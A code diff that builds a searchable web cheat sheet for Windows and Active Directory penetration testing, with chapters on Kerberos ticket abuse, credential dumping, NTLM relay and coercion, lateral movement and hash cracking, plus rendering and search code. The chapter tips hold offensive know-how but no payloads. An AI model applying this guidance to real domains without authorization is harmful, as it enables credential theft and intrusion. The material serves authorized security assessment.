+        note:'The six built-in tools in the CMD chapter — setspn, klist, cmdkey, vaultcmd, auditpol and wevtutil — also run from PowerShell.'}
+    ]
+  },
+  {
+    id:'wmi', tab:'wmi', num:'03', kicker:'System data', title:'WMI / CIM', track:'win',
+    intro:'WMI exposes hardware and operating-system state through classes. In modern PowerShell you read those classes with Get-CimInstance.',
+    tip:'The older wmic.exe is deprecated and removed by default on recent Windows builds; the CIM cmdlets are the supported path.',
+    sections:[
+      {id:'wmi-classes', title:'Win32 classes', key:'WMI / CIM Classes'}
+    ]
+  },
+  {
+    id:'ad', tab:'ad', num:'04', kicker:'Domain services', title:'Active Directory', track:'ad',
+    intro:'Two ways into the same directory: the Get-AD* cmdlets from RSAT, and built-in tools such as net.exe, nltest.exe and gpresult.exe that work on any domain-joined host. The first three sections need RSAT; the last three do not.',
+    tip:'Run Import-Module ActiveDirectory first, then Get-Module ActiveDirectory to confirm it loaded. If RSAT is not available, drop to the CMD sections at the end — less detail, nothing to install.',
+    sections:[
+      {id:'ad-domain', title:'Domain & Forest', key:'Domain & Forest', note:'RSAT — confirm which domain and forest the foothold belongs to before querying objects.'},
+      {id:'ad-users', title:'Users, Groups & Computers', key:'Users, Groups & Computers', note:'RSAT — request extra attributes explicitly with -Properties; the default view is trimmed.'},
+      {id:'ad-gpo', title:'Group Policy & Permissions', key:'Group Policy & Permissions', note:'RSAT — Get-GPO needs the GroupPolicy module; Get-Acl reads an AD object ACL.'},
+      {id:'ad-cmd-users', title:'Users & Groups (CMD)', key:'Users & Groups (CMD)', note:'No RSAT needed — built-in net.exe talks to the domain from any domain-joined host.'},
+      {id:'ad-cmd-network', title:'Network & Domain Discovery (CMD)', key:'Network & Domain Discovery (CMD)', note:'No RSAT needed — nltest.exe ships with Windows.'},
+      {id:'ad-cmd-gpo', title:'Group Policy (CMD)', key:'Group Policy (CMD)', note:'No RSAT needed — gpresult.exe reports the policies applied to this host.'}
+    ]
+  },
+  {
+    id:'toolindex', tab:'toolindex', num:'05', kicker:'Reference', title:'Tool Index', track:'tools', kind:'index',
+    intro:'The toolkit behind the chapters that follow &mdash; 48 tools, what each one does, and which side of the attack host it normally runs from. Use it as a map before diving into syntax.',
+    tip:'Most of these are third-party projects, not Windows features. Flags drift between releases, so run the tool help when syntax fails.',
+    sections:[]
+  },
+  {
+    id:'sit', tab:'sit', num:'06', kicker:'Reconnaissance', title:'Situational Awareness', track:'tools',
+    intro:'Map the domain before you touch it: who exists, what they can reach, where the ACLs and trusts lead, and which hosts the current account can administer. PowerView answers most of that from Windows; BloodHound.py collects the same graph from Linux.',
+    tip:'Import PowerView once per session, then chain commands. Every Get-Domain* call is a live LDAP query, so expect it to be logged.',
+    sections:[
+      {id:'sit-win', title:'Windows — PowerView & SharpHound', key:'Windows — PowerView & SharpHound',
+        note:'PowerView, SharpView and SharpHound — run from a domain-joined Windows host with a valid logon session.'},
+      {id:'sit-linux', title:'Linux — BloodHound.py', key:'Linux — BloodHound.py',
+        note:'Point DNS at the target DC before collecting; BloodHound.py resolves the domain through the system resolver.'}
+    ]
+  },
+  {
+    id:'enum', tab:'enum', num:'07', kicker:'Discovery', title:'Enumeration & SMB', track:'tools',
+    intro:'The first pass over SMB, RPC and LDAP. The Windows-side queries need nothing installed; the Linux side leans on rpcclient, enum4linux, CrackMapExec and ldapsearch. Start unauthenticated, then repeat with any credential you obtain &mdash; the result set changes completely.',
+    tip:'Anonymous binds are increasingly rare. Treat a failed anonymous query as normal, not as a dead end.',
+    sections:[
+      {id:'enum-win', title:'Windows — Built-in Discovery', key:'Windows — Built-in Discovery',
+        note:'net.exe, dsquery, netdom and wmic. No RSAT required.'},
+      {id:'enum-linux', title:'Linux — SMB, RPC & LDAP', key:'Linux — SMB, RPC & LDAP',
+        note:'Run from the Linux attack host. Spraying through CrackMapExec or Kerbrute can lock accounts — read the policy first.'}
+    ]
+  },
+  {
+    id:'kerb', tab:'kerb', num:'08', kicker:'Ticket abuse', title:'Kerberos Abuse', track:'tools',
+    intro:'Kerberos issues the tickets; these tools abuse them. Rubeus does it from Windows, Impacket and Kerbrute from Linux. The workflow is the same on both sides: find an SPN or a pre-auth-disabled account, request the ticket, crack it offline.',
+    tip:'RC4 tickets (mode 13100) crack far faster than AES (19700). Check msDS-SupportedEncryptionTypes before committing to a wordlist.',
+    sections:[
+      {id:'kerb-win', title:'Windows — Rubeus', key:'Windows — Rubeus',
+        note:'Rubeus and setspn — useful for requesting tickets, not only listing them.'},
+      {id:'kerb-linux', title:'Linux — Impacket & Kerbrute', key:'Linux — Impacket & Kerbrute',
+        note:'Most commands accept -dc-ip, -target-domain and -hashes; add -outputfile to keep the tickets.'}
+    ]
+  },
+  {
+    id:'creds', tab:'creds', num:'09', kicker:'Credential access', title:'Credential Access', track:'tools',
+    intro:'Getting from an account to its secrets. On Windows that means Mimikatz and ACL abuse; on Linux it means secretsdump, GPP decryption and SID lookups. Both paths end in the same place: hashes, tickets or cleartext you can reuse.',
+    tip:'DCSync needs replication rights, not Domain Admin. Check Get-ObjectAcl for Replication-Get-Changes-All before assuming you cannot dump.',
+    sections:[
+      {id:'creds-win', title:'Windows — Mimikatz & ACL abuse', key:'Windows — Mimikatz & ACL abuse',
+        note:'Mimikatz needs SeDebugPrivilege for LSASS access; ACL abuse needs only the delegated right.'},
+      {id:'creds-linux', title:'Linux — secretsdump & GPP', key:'Linux — secretsdump & GPP',
+        note:'secretsdump writes several files — hashes, Kerberos keys and sometimes cleartext.'}
+    ]
+  },
+  {
+    id:'exec', tab:'exec', num:'10', kicker:'Lateral movement', title:'Execution & Lateral Movement', track:'tools',
+    intro:'Turning credentials into a shell. WinRM is the quietest path on Windows; Impacket covers SMB, WMI and MSSQL from Linux. Pick the protocol the target actually exposes rather than the one you prefer.',
+    tip:'psexec drops a service and leaves a binary behind. wmiexec and WinRM are less noisy; choose deliberately.',
+    sections:[
+      {id:'exec-win', title:'Windows — WinRM & MSSQL', key:'Windows — WinRM & MSSQL',
+        note:'WinRM, PowerUpSQL and host reconnaissance from a Windows host.'},
+      {id:'exec-linux', title:'Linux — Impacket & Evil-WinRM', key:'Linux — Impacket & Evil-WinRM',
+        note:'Add -k -no-pass to any Impacket tool to use a ccache instead of a password.'}
+    ]
+  },
+  {
+    id:'relay', tab:'relay', num:'11', kicker:'Coercion', title:'Poisoning, Relay & Coercion', track:'tools',
+    intro:'Make the target authenticate to you, then relay or crack what it sends. Responder and Inveigh poison name resolution; ntlmrelayx, PetitPotam and the noPac chain turn that callback into a certificate, a hash or a shell.',
+    tip:'Relay targets must have SMB signing disabled, and coercion needs a reachable spooler or EFSRPC endpoint. Verify both before firing.',
+    sections:[
+      {id:'relay-win', title:'Windows — Inveigh', key:'Windows — Inveigh',
+        note:'Inveigh — poisoning from a Windows host, with or without PowerShell.'},
+      {id:'relay-linux', title:'Linux — Responder, relay & coercion', key:'Linux — Responder, relay & coercion',
+        note:'These actions are disruptive. Scope them tightly and expect the target to notice.'}
+    ]
+  },
+  {
+    id:'crack', tab:'crack', num:'12', kicker:'Offline', title:'Offline Cracking', track:'tools',
+    intro:'Everything offline. The Hashcat modes are the part worth memorising: 5600 NetNTLMv2, 13100 Kerberoast RC4, 19700 Kerberoast AES, 18200 AS-REP. Convert tickets into a hashcat-friendly format first.',
+    tip:'Check the hash prefix before choosing a mode. A mode mismatch fails instantly rather than slowly, so a fast failure usually means the wrong -m.',
+    sections:[
+      {id:'crack-linux', title:'Linux — Hashcat & hash preparation', key:'Linux — Hashcat & hash preparation',
+        note:'Hashcat plus the ticket-to-hash conversion steps.'}
+    ]
+  },
+  {
+    id:'audit', tab:'audit', num:'13', kicker:'Assessment', title:'Auditing & Reporting', track:'tools',
+    intro:'Defensive review of the same directory: LAPS coverage, GPO permissions, stale objects and overall security posture. These tools produce the report you would hand to a client &mdash; or read before an assessment to find the gaps first.',
+    tip:'ADRecon and PingCastle are read-only but heavy. Run them off-hours and write the output somewhere you are allowed to keep it.',
+    sections:[
+      {id:'audit-win', title:'Windows — Audit & reporting', key:'Windows — Audit & reporting',
+        note:'ADRecon, PingCastle, Group3r and LAPSToolkit.'}
+    ]
+  }
+];
+
+
+/* Three top-level tracks. Tool chapters carry their own OS sections. */
+const TRACKS = [
+  {
+    id:'win', label:'Windows Native Commands', short:'Windows Native',
+    desc:'CMD, PowerShell and WMI — present on every Windows install.',
+    chapters:['cmd','powershell','wmi']
+  },
+  {
+    id:'ad', label:'Native AD Commands', short:'Native AD',
+    desc:'Domain, users, groups, policy and trusts — RSAT or built-in CMD.',
+    chapters:['ad']
+  },
+  {
+    id:'tools', label:'AD Toolkit', short:'AD Toolkit',
+    desc:'PowerView, Rubeus, Impacket, Responder and more — 48 tools, Windows and Linux.',
+    chapters:['toolindex','sit','enum','kerb','creds','exec','relay','crack','audit']
+  }
+];
+
+/* ------------------------------------------------------------------ */
+/*  Helpers                                                            */
+/* ------------------------------------------------------------------ */
+const $ = (sel) => document.querySelector(sel);
+const qEl = $('#q');
+const tocEl = $('#toc');
+const chaptersEl = $('#chapters');
+const statusEl = $('#searchStatus');
+const statusTextEl = $('#searchStatusText');
+const emptyEl = $('#empty');
+const emptyTextEl = $('#emptyText');
+const mainEl = document.querySelector('.main');
+const sidebarEl = $('#sidebar');
+const scrimEl = $('#scrim');
+const menuBtn = $('#menuBtn');
+const progressEl = $('#progress');
+
+const state = { q: '' };
+
+COMMANDS.forEach((c, i) => { c.id = 'c' + i; });
+const byId = new Map(COMMANDS.map((c) => [c.id, c]));
+
+function esc(s) {
+  return String(s).replace(/[&<>"]/g, (ch) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[ch]));
+}
+
+function primary(c) { return c.tabs[0]; }
+
+function renderCmd(cmd) {
+  return cmd
+    .split(/(<[^>]+>)/g)
+    .filter(Boolean)
+    .map((token) => /^<[^>]+>$/.test(token)
+      ? '<span class="ph">' + esc(token) + '</span>'
+      : esc(token))
+    .join('');
+}
+
+function badges(c) {
+  const out = [];
+  if (c.os === 'Windows') out.push(['os-win', 'Windows']);
+  else if (c.os === 'Linux') out.push(['os-linux', 'Linux']);
+  if (c.tool) out.push(['tool', c.tool]);
+  if (c.tabs.length > 1) out.push(['both', 'CMD + PowerShell']);
+  if (c.rsat) out.push(['req', 'RSAT']);
+  if (c.gp) out.push(['req', 'GroupPolicy module']);
+  if (c.defender) out.push(['req', 'Defender module']);
+  if (c.admin) out.push(['warn', 'Elevated']);
+  if (!out.length) return '';
+  return '<div class="badges">' +
+    out.map(([kind, text]) => '<span class="badge ' + kind + '">' + esc(text) + '</span>').join('') +
+    '</div>';
+}
+
+function chapterCommands(ch) {
+  return COMMANDS.filter((c) => primary(c) === ch.tab);
+}
+
+function sectionCommands(ch, sec) {
+  return COMMANDS.filter((c) => primary(c) === ch.tab && c.section === sec.key);
+}
+
+function trackChapters(tr) {
+  return tr.chapters.map((id) => CHAPTERS.find((ch) => ch.id === id)).filter(Boolean);
+}
+
+function trackCount(tr) {
+  return trackChapters(tr).reduce((n, ch) => n + chapterCommands(ch).length, 0);
+}
+
+function trackOf(ch) {
+  return TRACKS.find((tr) => tr.chapters.indexOf(ch.id) !== -1);
+}
+
+function heroTracksHTML() {
+  return TRACKS.map((tr, i) => {
+    const first = trackChapters(tr)[0];
+    return '<a class="track-card" href="#' + first.id + '" data-track="' + tr.id + '">' +
+      '<span class="track-tag">Track ' + (i + 1) + '</span>' +
+      '<strong>' + esc(tr.label) + '</strong>' +
+      '<p>' + esc(tr.desc) + '</p>' +
+      '<span class="track-meta">' + trackCount(tr) + ' commands</span>' +
+    '</a>';
+  }).join('');
+}
+
+/* ------------------------------------------------------------------ */
+/*  Templates                                                          */
+/* ------------------------------------------------------------------ */
+function rowHTML(c, ch) {
+  const search = (c.cmd + ' ' + c.purpose + ' ' + c.section + ' ' + ch.title + ' ' + (c.tool || '') + ' ' + (c.os || '')).toLowerCase();
+  return '<div class="cmd-row" data-copy="' + c.id + '" data-search="' + esc(search) + '" title="Click to copy">' +
+    '<div class="cmd-head">' +
+      '<code class="cmd">' + renderCmd(c.cmd) + '</code>' +
+      '<button class="copy-btn" type="button" aria-label="Copy: ' + esc(c.cmd) + '">Copy</button>' +
+    '</div>' +
+    '<p class="purpose">' + esc(c.purpose) + '</p>' +
+    badges(c) +
+  '</div>';
+}
+
+function sectionHTML(ch, sec) {
+  const items = sectionCommands(ch, sec);
+  return '<section class="section" id="' + sec.id + '" data-spy>' +
+    '<div class="sec-head">' +
+      '<h3>' + esc(sec.title) + '</h3>' +
+      '<span class="sec-count">' + items.length + '</span>' +
+    '</div>' +
+    (sec.note ? '<p class="sec-note">' + esc(sec.note) + '</p>' : '') +
+    '<div class="cmd-list">' + items.map((c) => rowHTML(c, ch)).join('') + '</div>' +
+  '</section>';
+}
+
+function indexChapterHTML(ch) {
+  const tr = trackOf(ch);
+  const rows = TOOLS.map((t) => {
+    const search = (t.name + ' ' + t.desc + ' ' + t.os + ' ' + ch.title).toLowerCase();
+    const osClass = t.os === 'Windows' ? 'os-win' : t.os === 'Linux' ? 'os-linux' : 'os-both';
+    return '<tr class="ref-row" data-search="' + esc(search) + '">' +
+      '<td class="ref-name">' + esc(t.name) + '</td>' +
+      '<td class="ref-desc">' + esc(t.desc) + '</td>' +
+      '<td class="ref-os"><span class="' + osClass + '">' + esc(t.os) + '</span></td>' +
+    '</tr>';
+  }).join('');
+
+  return '<section class="chapter" id="' + ch.id + '" data-spy>' +
+    '<p class="eyebrow">' + esc(tr ? tr.short : 'AD Toolkit') + ' &middot; Chapter ' + ch.num + ' &middot; ' + esc(ch.kicker) + '</p>' +
+    '<h2>' + esc(ch.title) + ' <span class="chapter-count">' + TOOLS.length + ' tools</span></h2>' +
+    '<p class="lead">' + ch.intro + '</p>' +
+    '<div class="tip"><strong>Tip</strong>' + ch.tip + '</div>' +
+    '<div class="ref-wrap"><div class="ref-scroll"><table class="ref-table">' +
+      '<thead><tr><th>Tool</th><th>What it does</th><th>Runs on</th></tr></thead>' +
+      '<tbody>' + rows + '</tbody></table></div></div>' +
+    '<p class="ref-count">Runs on describes the attack host, not the target. ' +
+      'Most tools appear again with syntax in the chapters that follow.</p>' +
+  '</section>';
+}
+
+function chapterHTML(ch) {
+  if (ch.kind === 'index') return indexChapterHTML(ch);
+  const n = chapterCommands(ch).length;
+  const tr = trackOf(ch);
+  return '<section class="chapter" id="' + ch.id + '" data-spy>' +
+    '<p class="eyebrow">' + esc(tr ? tr.short : 'Runbooks') + ' &middot; Chapter ' + ch.num + ' &middot; ' + esc(ch.kicker) + '</p>' +
+    '<h2>' + esc(ch.title) + ' <span class="chapter-count">' + n + (n === 1 ? ' command' : ' commands') + '</span></h2>' +
+    '<p class="lead">' + ch.intro + '</p>' +
+    '<div class="tip"><strong>Tip</strong>' + ch.tip + '</div>' +
+    ch.sections.map((sec) => sectionHTML(ch, sec)).join('') +
+  '</section>';
+}
+
+function workflowBlockHTML(w, wi) {
+  const search = ('workflow ' + w.title + ' ' + w.desc + ' ' + w.commands.join(' ')).toLowerCase();
+  return '<div class="workflow" data-search="' + esc(search) + '">' +
+    '<div class="wf-head">' +
+      '<div><h3>' + esc(w.title) + '</h3><p>' + esc(w.desc) + '</p></div>' +
+      '<button class="copy-btn" type="button" data-wf-all="' + wi + '">Copy all</button>' +
+    '</div>' +
+    '<ol class="wf-list">' +
+      w.commands.map((cmd, li) => {
+        const stepSearch = (cmd + ' ' + w.title).toLowerCase();
+        return '<li class="wf-step" data-wf-line="' + wi + '-' + li + '" data-search="' + esc(stepSearch) + '" title="Click to copy">' +
+          '<code>' + renderCmd(cmd) + '</code>' +
+          '<button class="copy-btn" type="button" aria-label="Copy: ' + esc(cmd) + '">Copy</button>' +
+        '</li>';
+      }).join('') +
+    '</ol>' +
+  '</div>';
+}
+
+function workflowsChapterHTML() {
+  return '<section class="chapter" id="workflows" data-spy>' +
+    '<p class="eyebrow">Runbooks &middot; Enumeration order</p>' +
+    '<h2>Quick enumeration workflows <span class="chapter-count">2 runbooks</span></h2>' +
+    '<p class="lead">A sensible order to run the commands in when you first land on a host you are authorized to assess. Copy a single step or the whole runbook.</p>' +
+    '<div class="tip"><strong>Tip</strong>Expect noise. Read the output rather than collecting everything — enumeration is evidence, not a finding on its own.</div>' +
+    WORKFLOWS.map((w, i) => workflowBlockHTML(w, i)).join('') +
+  '</section>';
+}
+
+/* ------------------------------------------------------------------ */
+/*  Sidebar                                                            */
+/* ------------------------------------------------------------------ */
+const COLLAPSED_TRACKS = new Set(['tools']);
+
+function tocGroupHead(trackId, href, label, count) {
+  const collapsed = COLLAPSED_TRACKS.has(trackId);
+  return '<div class="toc-group-head">' +
+    '<a class="toc-group-link" href="' + href + '">' +
+      '<span class="toc-group-name">' + esc(label) + '</span>' +
+      '<span class="toc-count">' + count + '</span>' +
+    '</a>' +
+    '<button class="toc-toggle" type="button" data-toggle-track="' + trackId + '" ' +
+      'aria-expanded="' + String(!collapsed) + '" aria-label="Toggle ' + esc(label) + '"></button>' +
+  '</div>';
+}
+
+function tocHTML() {
+  const parts = ['<p class="toc-label">Contents</p>', '<nav>'];
+
+  TRACKS.forEach((tr) => {
+    parts.push(
+      '<div class="toc-group" data-track="' + tr.id + '" data-collapsed="' + String(COLLAPSED_TRACKS.has(tr.id)) + '">' +
+        tocGroupHead(tr.id, '#' + trackChapters(tr)[0].id, tr.label, trackCount(tr)) +
+        '<div class="toc-group-body">'
+    );
+
+    trackChapters(tr).forEach((ch) => {
+      const n = ch.kind === 'index' ? '' : chapterCommands(ch).length;
+      const subs = ch.sections.length
+        ? '<ul class="toc-subs">' +
+            ch.sections.map((sec) => {
+              const sn = sectionCommands(ch, sec).length;
+              return '<li><a class="toc-link" href="#' + sec.id + '">' + esc(sec.title) +
+                '<span class="toc-count">' + sn + '</span></a></li>';
+            }).join('') +
+          '</ul>'
+        : '';
+      parts.push(
+        '<div class="toc-chapter">' +
+          '<a class="toc-link chapter-link" href="#' + ch.id + '">' + esc(ch.title) +
+            '<span class="toc-count">' + n + '</span></a>' +
+          subs +
+        '</div>'
+      );
+    });
+
+    parts.push('</div></div>');
+  });
+
+  parts.push(
+    '<div class="toc-group" data-track="runbooks">' +
+      '<div class="toc-group-head">' +
+        '<a class="toc-group-link" href="#workflows">' +
+          '<span class="toc-group-name">Runbooks</span>' +
+          '<span class="toc-count">2</span>' +
+        '</a>' +
+      '</div>' +
+      '<div class="toc-group-body">' +
+        '<div class="toc-chapter">' +
+          '<a class="toc-link chapter-link" href="#workflows">Quick enumeration workflows' +
+            '<span class="toc-count">2</span></a>' +
+        '</div>' +
+      '</div>' +
+    '</div>',
+    '<div class="toc-chapter">' +
+      '<a class="toc-link chapter-link" href="#notes">Safety &amp; scope</a>' +
+    '</div>',
+    '</nav>'
+  );
+
+  return parts.join('');
+}
+
+function updateTrackCounts() {
+  TRACKS.forEach((tr) => {
+    const group = tocEl.querySelector('.toc-group[data-track="' + tr.id + '"]');
+    if (!group) return;
+    let n = 0;
+    tr.chapters.forEach((id) => {
+      const chapter = document.getElementById(id);
+      if (chapter) n += visibleRows(chapter);
+    });
+    const count = group.querySelector('.toc-group-head .toc-count');
+    if (count) count.textContent = n;
+    const indexHit = tr.id === 'tools' && document.querySelector('#toolindex .ref-row:not([hidden])');
+    group.hidden = n === 0 && !indexHit;
+  });
+
+  const runbooks = tocEl.querySelector('.toc-group[data-track="runbooks"]');
+  if (runbooks) {
+    const n = document.querySelectorAll('.workflow:not([hidden])').length;
+    const count = runbooks.querySelector('.toc-group-head .toc-count');
+    if (count) count.textContent = n;
+    runbooks.hidden = n === 0;
+  }
+}
+
+/* ------------------------------------------------------------------ */
+/*  Search / filter                                                    */
+/* ------------------------------------------------------------------ */
+function visibleRows(el) {
+  return el.querySelectorAll('.cmd-row:not([hidden])').length;
+}
+
+function refreshCounts() {
+  tocEl.querySelectorAll('.toc-chapter, .toc-subs li').forEach((el) => { el.hidden = false; });
+  document.querySelectorAll('#toolindex .ref-row').forEach((row) => { row.hidden = false; });
+  const idxChapter = document.getElementById('toolindex');
+  if (idxChapter) idxChapter.hidden = false;
+
+  CHAPTERS.forEach((ch) => {
+    if (ch.kind === 'index') return;
+    const n = chapterCommands(ch).length;
+    const chLink = tocEl.querySelector('.toc-link[href="#' + ch.id + '"] .toc-count');
+    if (chLink) chLink.textContent = n;
+    const chCount = document.querySelector('#' + ch.id + ' .chapter-count');
+    if (chCount) chCount.textContent = n + (n === 1 ? ' command' : ' commands');
+    ch.sections.forEach((sec) => {
+      const sn = sectionCommands(ch, sec).length;
+      const secLink = tocEl.querySelector('.toc-link[href="#' + sec.id + '"] .toc-count');
+      if (secLink) secLink.textContent = sn;
+      const secCount = document.querySelector('#' + sec.id + ' .sec-count');
+      if (secCount) secCount.textContent = sn;
+    });
+  });
+  syncCollapse(false);
+}
+
+/* While searching, open every group that has a hit; otherwise restore the
+   reader's own collapsed state. */
+function syncCollapse(expandAll) {
+  tocEl.querySelectorAll('.toc-group[data-track]').forEach((group) => {
+    const has = !!group.querySelector('.toc-chapter:not([hidden])');
+    const collapsed = expandAll ? !has : COLLAPSED_TRACKS.has(group.dataset.track);
+    group.setAttribute('data-collapsed', String(collapsed));
+    const btn = group.querySelector('.toc-toggle');
+    if (btn) btn.setAttribute('aria-expanded', String(!collapsed));
+  });
+}
+
+function applyFilter() {
+  const q = state.q.trim().toLowerCase();
+  document.body.classList.toggle('searching', !!q);
+
+  document.querySelectorAll('.cmd-row').forEach((row) => {
+    row.hidden = q ? row.dataset.search.indexOf(q) === -1 : false;
+  });
+
+  let idxHits = 0;
+  const idxChapter = document.getElementById('toolindex');
+  if (idxChapter) {
+    idxChapter.querySelectorAll('.ref-row').forEach((row) => {
+      row.hidden = q ? row.dataset.search.indexOf(q) === -1 : false;
+      if (!row.hidden) idxHits += 1;
+    });
+    idxChapter.hidden = q ? idxHits === 0 : false;
+    const idxLink = tocEl.querySelector('.toc-link[href="#toolindex"]');
+    if (idxLink) {
+      const wrap = idxLink.closest('.toc-chapter');
+      if (wrap) wrap.hidden = q ? idxHits === 0 : false;
+    }
+  }
+
+  let commandHits = 0;
+
+  chaptersEl.querySelectorAll('.chapter').forEach((chapter) => {
+    if (chapter.id === 'workflows' || chapter.id === 'toolindex') return;
+    const n = visibleRows(chapter);
+    commandHits += n;
+    chapter.hidden = n === 0;
+    chapter.querySelectorAll('.section').forEach((sec) => {
+      const sn = visibleRows(sec);
+      sec.hidden = sn === 0;
+      const secCount = sec.querySelector('.sec-count');
+      if (secCount) secCount.textContent = sn;
+      const link = tocEl.querySelector('.toc-link[href="#' + sec.id + '"]');
+      if (link) {
+        link.querySelector('.toc-count').textContent = sn;
+        const li = link.closest('li');
+        if (li) li.hidden = sn === 0;
+      }
+    });
+    const headCount = chapter.querySelector('.chapter-count');
+    if (headCount && q) headCount.textContent = n + (n === 1 ? ' command' : ' commands');
+    const chLink = tocEl.querySelector('.toc-link[href="#' + chapter.id + '"]');
+    if (chLink) {
+      chLink.querySelector('.toc-count').textContent = n;
+      const wrap = chLink.closest('.toc-chapter');
+      if (wrap) wrap.hidden = n === 0;
+    }
+  });
+
+  let wfHits = 0;
+  let wfBlocks = 0;
+  document.querySelectorAll('.wf-step').forEach((step) => {
+    step.hidden = q ? step.dataset.search.indexOf(q) === -1 : false;
+  });
+  document.querySelectorAll('.workflow').forEach((block) => {
+    const n = block.querySelectorAll('.wf-step:not([hidden])').length;
+    wfHits += n;
+    if (n) wfBlocks += 1;
+    block.hidden = n === 0;
+  });
+
+  const wfChapter = document.getElementById('workflows');
+  if (wfChapter) {
+    wfChapter.hidden = wfBlocks === 0;
+    const wfLink = tocEl.querySelector('.toc-link[href="#workflows"] .toc-count');
+    if (wfLink) wfLink.textContent = q ? wfBlocks : 2;
+  }
+
+  syncCollapse(!!q);
+
+  if (!q) {
+    statusEl.hidden = true;
+    emptyEl.hidden = true;
+    refreshCounts();
+    updateTrackCounts();
+    spy();
+    return;
+  }
+
+  const shown = commandHits + wfHits + idxHits;
+  statusEl.hidden = false;
+  emptyEl.hidden = shown > 0;
+
+  const bits = [];
+  if (commandHits) bits.push(commandHits + (commandHits === 1 ? ' command' : ' commands'));
+  if (wfHits) bits.push(wfHits + (wfHits === 1 ? ' workflow step' : ' workflow steps'));
+  if (idxHits) bits.push(idxHits + (idxHits === 1 ? ' tool entry' : ' tool entries'));
+  statusTextEl.innerHTML = bits.length
+    ? 'Found <strong>' + bits.join('</strong> and <strong>') + '</strong> for “' + esc(state.q.trim()) + '”'
+    : 'No matches for “' + esc(state.q.trim()) + '”';
+  emptyTextEl.textContent = 'No commands match “' + state.q.trim() + '”.';
+  updateTrackCounts();
+  spy();
+}
+
+/* ------------------------------------------------------------------ */
+/*  Copy                                                               */
+/* ------------------------------------------------------------------ */
+async function copyText(text, container, btn) {
+  try {
+    await navigator.clipboard.writeText(text);
+  } catch (err) {
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    ta.setAttribute('readonly', '');
+    ta.style.position = 'fixed';
+    ta.style.top = '-1000px';
+    ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand('copy'); } catch (e) {}
+    ta.remove();
+  }
+
+  if (container) {
+    container.classList.add('flash');
+    setTimeout(() => container.classList.remove('flash'), 700);
+  }
+
+  if (btn) {
+    if (!btn.dataset.label) btn.dataset.label = btn.textContent;
+    btn.textContent = 'Copied';
+    btn.classList.add('done');
+    clearTimeout(btn._timer);
+    btn._timer = setTimeout(() => {
+      btn.textContent = btn.dataset.label;
+      btn.classList.remove('done');
+    }, 1400);
+  }
+}
+
+mainEl.addEventListener('click', (e) => {
+  if (e.target.closest('[data-wf-all]')) return;
+
+  const step = e.target.closest('.wf-step');
+  if (step) {
+    const parts = step.dataset.wfLine.split('-').map(Number);
+    const w = WORKFLOWS[parts[0]];
+    if (w && w.commands[parts[1]]) copyText(w.commands[parts[1]], step, step.querySelector('.copy-btn'));
+    return;
+  }
+
+  const row = e.target.closest('.cmd-row');
+  if (!row) return;
+
+  const btn = e.target.closest('.copy-btn');
+  if (!btn && window.getSelection().toString()) return;
+
+  const c = byId.get(row.dataset.copy);
+  if (c) copyText(c.cmd, row, btn || row.querySelector('.copy-btn'));
+});
+
+/* Copy-all buttons live in the workflow header, outside the step handler */
+mainEl.addEventListener('click', (e) => {
+  const all = e.target.closest('[data-wf-all]');
+  if (!all) return;
+  const w = WORKFLOWS[Number(all.dataset.wfAll)];
+  if (!w) return;
+  copyText(w.commands.join('\n'), all.closest('.workflow'), all);
+});
+
+/* ------------------------------------------------------------------ */
+/*  Search events                                                      */
+/* ------------------------------------------------------------------ */
+qEl.addEventListener('input', () => {
+  const hadQuery = !!state.q.trim();
+  state.q = qEl.value;
+  if (!hadQuery && state.q.trim()) window.scrollTo({ top: 0, behavior: 'auto' });
+  applyFilter();
+});
+
+$('#clearSearch').addEventListener('click', () => {
+  state.q = '';
+  qEl.value = '';
+  applyFilter();
+  qEl.focus();
+});
+
+$('#emptyReset').addEventListener('click', () => {
+  state.q = '';
+  qEl.value = '';
+  applyFilter();
+  qEl.focus();
+});
+
+/* ------------------------------------------------------------------ */
+/*  Mobile drawer                                                      */
+/* ------------------------------------------------------------------ */
+function setDrawer(open) {
+  sidebarEl.classList.toggle('open', open);
+  scrimEl.hidden = !open;
+  menuBtn.setAttribute('aria-expanded', String(open));
+  document.body.style.overflow = open ? 'hidden' : '';
+}
+menuBtn.addEventListener('click', () => setDrawer(true));
+$('#closeMenu').addEventListener('click', () => setDrawer(false));
+scrimEl.addEventListener('click', () => setDrawer(false));
+
+tocEl.addEventListener('click', (e) => {
+  const toggle = e.target.closest('.toc-toggle');
+  if (toggle) {
+    const group = toggle.closest('.toc-group');
+    if (!group) return;
+    const collapse = group.getAttribute('data-collapsed') !== 'true';
+    group.setAttribute('data-collapsed', String(collapse));
+    toggle.setAttribute('aria-expanded', String(!collapse));
+    if (collapse) COLLAPSED_TRACKS.add(group.dataset.track);
+    else COLLAPSED_TRACKS.delete(group.dataset.track);
+    return;
+  }
+  if (e.target.closest('a')) setDrawer(false);
+});
+
+/* ------------------------------------------------------------------ */
+/*  Scrollspy + progress                                               */
+/* ------------------------------------------------------------------ */
+let spyTicking = false;
+let lastSpyId = null;
+
+function spy() {
+  const els = Array.from(document.querySelectorAll('[data-spy]'))
+    .filter((el) => el.offsetParent !== null);
+  if (!els.length) return;
+
+  const line = window.scrollY + 110;
+  let current = null;
+  els.forEach((el) => {
+    const top = el.getBoundingClientRect().top + window.scrollY;
+    if (top <= line) current = el;
+  });
+
+  if (window.innerHeight + window.scrollY >= document.documentElement.scrollHeight - 4) {
+    current = els[els.length - 1];
+  }
+
+  document.querySelectorAll('.toc-link').forEach((a) => {
+    a.classList.remove('active');
+    a.classList.remove('current');
+  });
+
+  if (!current) return;
+
+  const changed = current.id !== lastSpyId;
+  const link = tocEl.querySelector('.toc-link[href="#' + current.id + '"]');
+  if (link) {
+    const group = link.closest('.toc-group');
+    if (group && group.getAttribute('data-collapsed') === 'true' && changed && !state.q.trim()) {
+      group.setAttribute('data-collapsed', 'false');
+      COLLAPSED_TRACKS.delete(group.dataset.track);
+      const btn = group.querySelector('.toc-toggle');
+      if (btn) btn.setAttribute('aria-expanded', 'true');
+    }
+    link.classList.add('active');
+    const parent = link.closest('.toc-chapter');
+    if (parent) {
+      const chapterLink = parent.querySelector('.chapter-link');
+      if (chapterLink && chapterLink !== link) chapterLink.classList.add('current');
+    }
+    if (changed) {
+      const linkRect = link.getBoundingClientRect();
+      const sideRect = sidebarEl.getBoundingClientRect();
+      if (linkRect.top < sideRect.top + 56 || linkRect.bottom > sideRect.bottom - 16) {
